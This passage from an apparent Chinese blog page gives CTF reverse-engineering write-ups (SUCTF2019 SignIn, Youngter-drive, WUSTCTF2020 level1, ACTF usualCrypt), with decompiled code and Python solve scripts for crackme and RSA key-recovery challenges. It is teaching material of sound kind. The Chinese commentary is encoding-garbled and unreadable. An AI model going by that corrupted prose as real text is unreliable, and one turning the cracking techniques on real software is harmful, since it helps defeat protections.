class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">a1 = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line">a1[<span class="number">31</span>] = <span class="number">125</span></span><br><span class="line">a1[<span class="number">30</span>] = <span class="number">55</span></span><br><span class="line">a1[<span class="number">29</span>] = <span class="number">51</span></span><br><span class="line">a1[<span class="number">28</span>] = <span class="number">51</span></span><br><span class="line">a1[<span class="number">27</span>] = <span class="number">57</span></span><br><span class="line">a1[<span class="number">26</span>] = <span class="number">51</span></span><br><span class="line">a1[<span class="number">25</span>] = <span class="number">48</span></span><br><span class="line">a1[<span class="number">24</span>] = <span class="number">99</span></span><br><span class="line">a1[<span class="number">23</span>] = <span class="number">49</span></span><br><span class="line">a1[<span class="number">22</span>] = <span class="number">97</span></span><br><span class="line">a1[<span class="number">21</span>] = <span class="number">57</span></span><br><span class="line">a1[<span class="number">20</span>] = <span class="number">57</span></span><br><span class="line">a1[<span class="number">19</span>] = <span class="number">48</span></span><br><span class="line">a1[<span class="number">18</span>] = <span class="number">51</span></span><br><span class="line">a1[<span class="number">16</span>] = <span class="number">97</span></span><br><span class="line">a1[<span class="number">17</span>] = <span class="number">48</span></span><br><span class="line">a1[<span class="number">15</span>] = <span class="number">98</span></span><br><span class="line">a1[<span class="number">14</span>] = <span class="number">48</span></span><br><span class="line">a1[<span class="number">13</span>] = <span class="number">49</span></span><br><span class="line">a1[<span class="number">12</span>] = <span class="number">49</span></span><br><span class="line">a1[<span class="number">11</span>] = <span class="number">49</span></span><br><span class="line">a1[<span class="number">10</span>] = <span class="number">50</span></span><br><span class="line">a1[<span class="number">9</span>] = <span class="number">52</span></span><br><span class="line">a1[<span class="number">8</span>] = <span class="number">53</span></span><br><span class="line">a1[<span class="number">7</span>] = <span class="number">54</span></span><br><span class="line">a1[<span class="number">5</span>] = <span class="number">101</span></span><br><span class="line">a1[<span class="number">4</span>] = <span class="number">123</span></span><br><span class="line">a1[<span class="number">3</span>] = <span class="number">103</span></span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">97</span></span><br><span class="line">a1[<span class="number">1</span>] = <span class="number">108</span></span><br><span class="line">a1[<span class="number">0</span>] = <span class="number">102</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">6</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(a1[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸º6æ²¡æœ‰ï¼Œæ‰€ä»¥åªèƒ½ä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œæ°å·§ç¬¬ä¸€ä¸ªå°±å¯ã€‚</p><h1 id="0x0B-SUCTF2019-SignIn"><a href="#0x0B-SUCTF2019-SignIn" class="headerlink" title="0x0B.[SUCTF2019]SignIn"></a>0x0B.[SUCTF2019]SignIn</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-4A0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-490h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-480h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-470h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> input[<span class="number">112</span>]; <span class="comment">// [rsp+40h] [rbp-460h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v9[<span class="number">1000</span>]; <span class="comment">// [rsp+B0h] [rbp-3F0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+498h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[sign in]&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[input your flag]: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%99s&quot;</span>, input);</span><br><span class="line">  sub_96A(input, v9);</span><br><span class="line">  __gmpz_init_set_str(v7, <span class="string">&quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;</span>, <span class="number">16LL</span>);</span><br><span class="line">  __gmpz_init_set_str(v6, v9, <span class="number">16LL</span>);</span><br><span class="line">  __gmpz_init_set_str(v4, <span class="string">&quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;</span>, <span class="number">10LL</span>);</span><br><span class="line">  __gmpz_init_set_str(v5, <span class="string">&quot;65537&quot;</span>, <span class="number">10LL</span>);</span><br><span class="line">  __gmpz_powm(v6, v6, v5, v4);</span><br><span class="line">  <span class="keyword">if</span> ( __gmpz_cmp(v6, v7) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;GG!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;TTTTTTTTTTql!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„<code>sub_96A</code>å°±æ˜¯è½¬16è¿›åˆ¶ï¼Œç„¶åæ˜¯<code>__gmpz_init_set_str</code>ï¼Œè¿™ä¸ªæ˜¯ GNU é«˜ç²¾åº¦ç®—æ³•åº“ã€‚è´´ä¸ªå®˜ç½‘:<a href="https://gmplib.org/manual/">https://gmplib.org/manual/</a></p><p><code>__gmpz_powm</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mpz_powm</span> <span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">const</span> <span class="keyword">mpz_t</span> base, <span class="keyword">const</span> <span class="keyword">mpz_t</span> <span class="built_in">exp</span>, <span class="keyword">const</span> <span class="keyword">mpz_t</span> mod)</span> [Function]</span></span><br><span class="line"><span class="function">Set rop to base^<span class="built_in">exp</span> mod mod.</span></span><br></pre></td></tr></table></figure><p>å°±æ˜¯è®¡ç®—baseçš„expæ¬¡æ–¹ï¼Œç„¶åå¯¹modå–æ¨¡ï¼Œå­˜åˆ°ropã€‚</p><p>è¿™é‡Œå†çœ‹ä¸‹RSAçš„åŠ è§£å¯†æƒ…å†µï¼š</p><blockquote><p>  c  = (m ^ e) mod n</p><p>  å…¶ä¸­cä¸ºå¯†æ–‡ï¼Œmä¸ºæ˜æ–‡ï¼Œeä¸ºå…¬é’¥</p></blockquote><blockquote><p>  m = (c ^ d) mod n</p><p>  dæ˜¯eå…³äºphi(N)çš„æ¨¡åå…ƒç´ </p></blockquote><p>äºæ˜¯ä¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C = ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span><br><span class="line">m = input</span><br><span class="line">e = 65537</span><br><span class="line">N = 103461035900816914121390101299049044413950405173712170434161686539878160984549</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡åœ¨çº¿ç½‘ç«™åˆ†è§£pqæˆ–è€…ä½¿ç”¨yafuä¹Ÿå¯ï¼š</p><blockquote><p>  p = 282164587459512124844245113950593348271</p><p>  q = 366669102002966856876605669837014229419</p></blockquote><p>å†ä¹‹åå°±æ˜¯è®¡ç®—ç§é’¥dï¼Œæ ¹æ®å¯†æ–‡ï¼Œç§é’¥ï¼ŒNè®¡ç®—æ˜æ–‡</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">C = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">N = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">d = gmpy2.invert(e, (q-<span class="number">1</span>)*(p-<span class="number">1</span>))</span><br><span class="line">m = gmpy2.powmod(C, d, N)</span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h1 id="0x0C-Youngter-drive"><a href="#0x0C-Youngter-drive" class="headerlink" title="0x0C.Youngter-drive"></a>0x0C.Youngter-drive</h1><p>æŸ¥å£³å‘ç°æ˜¯upxï¼Œæœ‰ä¸€ä¸ªè¾“å…¥ï¼Œç„¶åæ˜¯ä¸¤ä¸ªçº¿ç¨‹</p><p>å…ˆçœ‹ä¸‹ç¬¬ä¸€ä¸ªçº¿ç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __stdcall <span class="title">StartAddress_0</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    WaitForSingleObject(hObject, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dword_418008 &gt; <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_41112C(&amp;input, dword_418008);</span><br><span class="line">      --dword_418008;</span><br><span class="line">      Sleep(<span class="number">0x64</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    ReleaseMutex(hObject);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sub_41112Cå‡½æ•°(å¥—äº†ä¸€å±‚)ï¼š</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_411940</span><span class="params">(<span class="keyword">char</span> *input, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+D3h] [ebp-5h]</span></span><br><span class="line"></span><br><span class="line">  v3 = input[a2];</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &lt; <span class="number">97</span> || v3 &gt; <span class="number">122</span>) &amp;&amp; (v3 &lt; <span class="number">65</span> || v3 &gt; <span class="number">90</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">97</span> || v3 &gt; <span class="number">122</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    input[a2] = off_418000[<span class="number">0</span>][input[a2] - <span class="number">38</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    input[a2] = off_418000[<span class="number">0</span>][input[a2] - <span class="number">96</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯å°å†™ï¼Œå½“å‰å­—ç¬¦çš„asciiå‡96ä¹‹ååˆ°off_418000æŸ¥ï¼›å¦‚æœæ˜¯å¤§å†™ï¼Œå‡38</p><p>ç¬¬äºŒä¸ªçº¿ç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __stdcall <span class="title">sub_411B10</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    WaitForSingleObject(hObject, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dword_418008 &gt; <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Sleep(<span class="number">0x64</span>u);</span><br><span class="line">      --dword_418008;</span><br><span class="line">    &#125;</span><br><span class="line">    ReleaseMutex(hObject);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å„ä¸€ä¸ªå­—ç¬¦åŠ å¯†ï¼Œå¥½å®¶ä¼™å¹¸äºä¹‹å‰çœ‹è¿‡Windowsç¨‹åºè®¾è®¡ï¼Œè¦ä¸ç„¶è¿˜çœŸå¯èƒ½çœ‹ä¸æ‡‚.</p><p>å†ä¹‹åçš„æœ‰ä¸ªä¸æœ¬åœ°å­—ç¬¦ä¸²çš„æ¯”è¾ƒï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_411880</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+D0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( input[i] != off_418004[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;\nflag&#123;%s&#125;\n\n&quot;</span>, Destination);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªæ¯”è¾ƒäº†29ä½ï¼Œä½†æ˜¯ä¸€å…±æœ‰30ä½ï¼Œå°è¯•åˆ°Eæ­£å¥½å¯ä»¥ï¼šexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">off_418000 = <span class="string">&#x27;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line">off_418004 = <span class="string">&#x27;TOiZiZtOrYaToUwPnToBsOaOapsyS&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(off_418004)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(off_418004[i], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> off_418004[i].isupper():</span><br><span class="line">        a = <span class="built_in">chr</span>(off_418000.find(off_418004[i])+<span class="number">96</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a = <span class="built_in">chr</span>(off_418000.find(off_418004[i])+<span class="number">38</span>)</span><br><span class="line">    <span class="built_in">print</span>(a, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># i += 1</span></span><br><span class="line"><span class="comment">#ThisisthreadofwindowshahaIsES</span></span><br><span class="line"><span class="comment">#y</span></span><br></pre></td></tr></table></figure><h1 id="0x0D-WUSTCTF2020-level1"><a href="#0x0D-WUSTCTF2020-level1" class="headerlink" title="0x0D.[WUSTCTF2020]level1"></a>0x0D.[WUSTCTF2020]level1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> ptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  fread(ptr, <span class="number">1uLL</span>, <span class="number">0x14</span>uLL, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, (ptr[i] &lt;&lt; i));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, (i * ptr[i]));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯å°†outputçš„æ–‡ä»¶é€†ä¸€éï¼Œæ³¨æ„ä¸Šé¢æ˜¯ä»1å¼€å§‹çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">198</span>,</span><br><span class="line">     <span class="number">232</span>,</span><br><span class="line">     <span class="number">816</span>,</span><br><span class="line">     <span class="number">200</span>,</span><br><span class="line">     <span class="number">1536</span>,</span><br><span class="line">     <span class="number">300</span>,</span><br><span class="line">     <span class="number">6144</span>,</span><br><span class="line">     <span class="number">984</span>,</span><br><span class="line">     <span class="number">51200</span>,</span><br><span class="line">     <span class="number">570</span>,</span><br><span class="line">     <span class="number">92160</span>,</span><br><span class="line">     <span class="number">1200</span>,</span><br><span class="line">     <span class="number">565248</span>,</span><br><span class="line">     <span class="number">756</span>,</span><br><span class="line">     <span class="number">1474560</span>,</span><br><span class="line">     <span class="number">800</span>,</span><br><span class="line">     <span class="number">6291456</span>,</span><br><span class="line">     <span class="number">1782</span>,</span><br><span class="line">     <span class="number">65536000</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> (i+<span class="number">1</span>) &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]//(i+<span class="number">1</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i] &gt;&gt; (i+<span class="number">1</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="0x0E-ACTFæ–°ç”Ÿèµ›2020-usualCrypt"><a href="#0x0E-ACTFæ–°ç”Ÿèµ›2020-usualCrypt" class="headerlink" title="0x0E.[ACTFæ–°ç”Ÿèµ›2020]usualCrypt"></a>0x0E.[ACTFæ–°ç”Ÿèµ›2020]usualCrypt</h1><p>idaè¯†åˆ«çš„å¾ˆå¤šä¸œè¥¿éƒ½æœ‰é—®é¢˜ï¼Œæ”¹äº†å¾ˆå¤š</p><p>mainï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">12</span>]; <span class="comment">// [esp+8h] [ebp-74h] BYREF</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+14h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [esp+16h] [ebp-66h]</span></span><br><span class="line">  <span class="keyword">char</span> input[<span class="number">100</span>]; <span class="comment">// [esp+18h] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(aGiveMeYourFlag);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  *v5 = <span class="number">0</span>;</span><br><span class="line">  *&amp;v5[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  *&amp;v5[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  sub_401080(input, <span class="built_in">strlen</span>(input), v5);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v5[v3] == aZmxhz3tignxlxj[v3] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v3 &gt; <span class="built_in">strlen</span>(v5) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(aError);</span><br><span class="line">LABEL_6:</span><br><span class="line">  <span class="keyword">if</span> ( v3 - <span class="number">1</span> == <span class="built_in">strlen</span>(aZmxhz3tignxlxj) )</span><br><span class="line">      <span class="comment">//zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9</span></span><br><span class="line">    result = <span class="built_in">puts</span>(aAreYouHappyYes);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(aAreYouHappyNo);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„sub_401080:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_401080</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> 